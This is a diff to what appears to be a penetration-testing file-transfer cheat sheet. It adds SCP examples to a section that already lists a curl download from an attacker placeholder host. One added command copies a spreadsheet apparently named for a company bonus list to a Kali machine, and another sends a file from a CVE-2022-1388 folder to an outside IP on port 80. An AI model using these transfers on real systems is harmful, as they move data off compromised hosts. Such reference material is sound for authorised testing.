@@ -408,4 +408,9 @@ curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 <details>
 <summary>SCP</summary></br>
 
+```bash
+scp.exe '.\Bonus List of IDIC Group 1400.xlsx' kali@192.168.152.128:/home/kali/Desktop
+scp.exe -P 80 C:\Users\user\Desktop\F5-CVE-2022-1388\nss-f5.yaml farshad@192.227.134.67:/home/farshad/
+scp user@remote_host:/remote/directory/remote_file.txt /local/directory/
+```
 </details>
